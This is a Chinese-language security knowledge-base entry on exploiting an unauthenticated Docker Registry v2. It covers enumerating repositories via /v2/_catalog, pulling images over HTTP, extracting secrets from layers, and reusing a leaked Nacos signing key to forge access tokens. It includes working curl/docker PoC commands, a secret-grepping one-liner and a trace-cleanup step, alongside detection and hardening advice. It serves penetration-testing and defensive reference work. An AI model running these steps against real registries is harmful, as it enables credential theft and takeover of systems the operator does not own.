---
id: cloud-container-docker-registry-v2-unauth-catalog-image-secret-dump
title: Docker Registry v2 未授权：/v2/_catalog 枚举私有仓库、insecure-registries 拉取镜像并从镜像层/配置提取密钥
type: scenario
domain: cloud
path: cloud/container
technique: docker-registry-v2-unauth-catalog-image-secret-dump
aliases:
- Docker Registry 未授权
- /v2/_catalog 信息泄露
- 私有镜像仓库未授权拉取
- insecure-registries
- 镜像层提取凭据
- registry v2 API
tags:
- container
- docker
- registry
- unauthorized
- image
- credential-leak
- information-disclosure
- cloud
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V351
  verified_at: '2026-11-09T00:44:58+08:00'
  notes: 已对照原文与图01-08核对：fscan 发现 5000 端口、/v2/ 与 /v2/_catalog 未授权返回 {"repositories":["nacos"]}、manifest schemaVersion 1/fLayers、docker pull 报 HTTP->HTTPS 错误后 daemon.json insecure-registries 生效拉取、docker run/exec 进容器读 conf/application.properties 的 token.secret.key 均与原文一致。与 Harbor CVE-2022-46463 卡为不同触发条件（无 CVE、纯配置未授权）与不同 PoC，kb dedup 判 new。原文无组件版本/CVE，affected_versions 已 clear（Nacos 2.2.3 为攻击者本地复用环境版本，非受影响版本）；PoC 未执行。
---

## 一句话结论

私有 Docker Registry（distribution）若未启用认证，攻击者可直接访问 `/v2/` 与 `/v2/_catalog` 枚举全部仓库，读取 manifest 后用 `docker pull`（客户端配置 `insecure-registries` 走 HTTP）拉取镜像；解包镜像层或运行容器即可读取打包在镜像里的配置文件、密钥与业务代码——本例从私有 Nacos 镜像的 `conf/application.properties` 中取得 `nacos.core.auth.plugin.nacos.token.secret.key`，再用它伪造/复用 Nacos accessToken 接管配置中心。

## 原理

- **Registry v2 API 本身不强制认证**：Docker Registry 的 `/v2/` 是 API 版本探测端点，`/v2/_catalog` 列出仓库名，`/v2/<name>/manifests/<tag>` 返回 manifest（含各层 blob 的 digest），`/v2/<name>/blobs/<digest>` 下载层数据。是否要求认证取决于部署配置——未配置 auth/TLS 的私有仓库对这些端点完全开放。
- **镜像就是可分发的文件系统**：manifest 指向的每个 layer 是 tar.gz，叠加后就是容器 rootfs；`docker save`/`docker export` 或直接下载 blob 解包后，应用配置、脚本、证书、密钥都在里面。构建时被 `COPY` 进镜像的 `application.properties`、`.env`、jar 内 `BOOT-INF/classes` 配置对任何能拉取镜像的人可见。
- **客户端 HTTP 限制**：Docker 默认要求 registry 使用 HTTPS；仓库未配证书时，需在客户端 `/etc/docker/daemon.json` 写入 `"insecure-registries": ["host:5000"]` 并重启 docker，才能用 HTTP 拉取。这只改变客户端行为，不代表仓库本身安全。
- **为什么危害会扩散**：镜像里的 `token.secret.key` 是 HS256 对称密钥，Nacos 只用它验签 accessToken、不校验签发者；攻击者可在本地起一个同密钥的 Nacos 实例，正常登录取得一个合法签名的 token，再把该 token 用于目标 Nacos——因为两端密钥相同，目标验签通过并视为已认证用户。密钥（或数据库口令、云 AK/SK、第三方 API key）由此从“镜像内配置”变成“可直接接管目标系统”。
- **前提**：registry 端口（常见 5000）网络可达且未启用认证；`/v2/_catalog` 未被单独限制；客户端允许 insecure registry；镜像中确实打包了敏感配置。

## 触发条件

- 目标 Docker Registry（distribution/私有 registry）暴露在攻击者可达网络，且未配置认证（无 Basic Auth/token 服务）或认证可绕过。
- `/v2/` 返回 200、`/v2/_catalog` 返回仓库列表；manifest 与 blob 可匿名读取。
- 攻击者能修改本机 Docker daemon 配置以允许 HTTP registry，或使用支持明文 HTTP 的客户端（skopeo/crane/curl 直接下 blob）。
- 镜像中打包了配置文件、密钥或业务代码等敏感内容。
- 若要把泄露的密钥用于其他系统，目标系统与该镜像使用同一密钥/配置。

## 利用步骤

1. 端口扫描发现 registry（如 5000），请求 `http://<host>:5000/v2/` 确认 API 可用（返回 `{}` 或 200 表示无需认证即可访问）。
2. 请求 `http://<host>:5000/v2/_catalog` 列出仓库名（如 `{"repositories":["nacos","app"]}`）。
3. 请求 `http://<host>:5000/v2/<repo>/manifests/latest`（带 `Accept: application/vnd.docker.distribution.manifest.v2+json`）读取 manifest，记录 layer digest；也可直接 `docker pull`。
4. 客户端配置 `"insecure-registries": ["<host>:5000"]` 并重启 docker；`docker pull <host>:5000/<repo>:<tag>`。
5. 提取镜像内容：`docker create` + `docker export`，或 `docker save` 后逐层解包 tar；重点检查 `conf/`、`application.properties`、`.env`、jar 内 `BOOT-INF/classes`、脚本与证书。
6. 使用提取到的凭据：如 Nacos 的 `token.secret.key`，在本地以相同配置启动同版本 Nacos，登录取得合法 accessToken，再用于目标 Nacos；数据库/云密钥则直接连接对应服务验证。
7. 清理本地镜像与容器，避免在攻击机上留下痕迹。

## PoC

```bash
# 1) 探测未授权 registry
curl -s http://<host>:5000/v2/
curl -s http://<host>:5000/v2/_catalog

# 2) 查看仓库 manifest（获取 layer digest）
curl -s -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
  http://<host>:5000/<repo>/manifests/latest

# 3) 客户端允许 HTTP registry 后拉取
cat >> /etc/docker/daemon.json <<'EOF'
{
  "insecure-registries": ["<host>:5000"]
}
EOF
systemctl restart docker
docker pull <host>:5000/<repo>:<tag>

# 4) 提取镜像文件系统并查看配置
docker create --name dump <host>:5000/<repo>:<tag>
docker export dump | tar -xf - -C ./rootfs
grep -R "secret\|password\|token" ./rootfs/etc ./rootfs/app ./rootfs/conf 2>/dev/null

# 5) 例：从 Nacos 镜像的 application.properties 取得 token.secret.key
#    nacos.core.auth.plugin.nacos.token.secret.key=<base64 key>
```

## 变体与关联

- **其他 registry 实现**：Harbor、Nexus、GitLab Container Registry、云厂商 ACR/ECR/CCR 均有各自的未授权/弱认证面；Harbor 的 CVE-2022-46463 未授权 dump 见 [[cloud-container-harbor-cve-2022-46463-unauth-image-dump]]。
- **不需要 docker 的拉取**：`skopeo copy docker://<host>:5000/<repo> dir:./out`、`crane pull`、直接按 manifest 下载 blob 再解包，可在不能改 daemon 配置的环境完成。
- **镜像层之外的落点**：镜像 tag 轮询投毒/重推（[[cloud-container-registry-polling-image-tag-repoison-escape]]）可让目标重新拉取恶意镜像；registry 的 push/delete API 未授权还可能删除或覆盖镜像。
- **密钥复用**：从镜像取得的 JWT/HMAC 密钥、数据库口令、云 AK/SK 可横向到配置中心、数据库、对象存储；Nacos 默认/已知 token.secret.key 的伪造见 [[web-java-component-nacos-default-token-secret-key-jwt-forge]]。

## 检测与防御

- **registry 加固**：启用 TLS 与认证（Basic/token service），禁止匿名 `_catalog`/manifest/blob 访问；网络层只允许受信网段访问 registry 端口；定期审计 registry 的访问日志与拉取来源。
- **镜像卫生**：不要把密钥、口令、私钥、`.env` 打包进镜像；使用 secret manager/运行时注入；构建时做 secret 扫描（如 gitleaks、trufflehog），镜像仓库启用漏洞与敏感信息扫描。
- **凭据轮换**：一旦发现镜像泄露，轮换镜像内所有凭据（Nacos token.secret.key、数据库口令、云 AK/SK），并检查使用同一密钥的其他环境。
- **检测**：监控异常的 `/v2/_catalog` 枚举、短时间大量 manifest/blob 下载、陌生 IP 对私有 registry 的 pull；对构建产物中的 `application.properties` 等配置做静态检查。
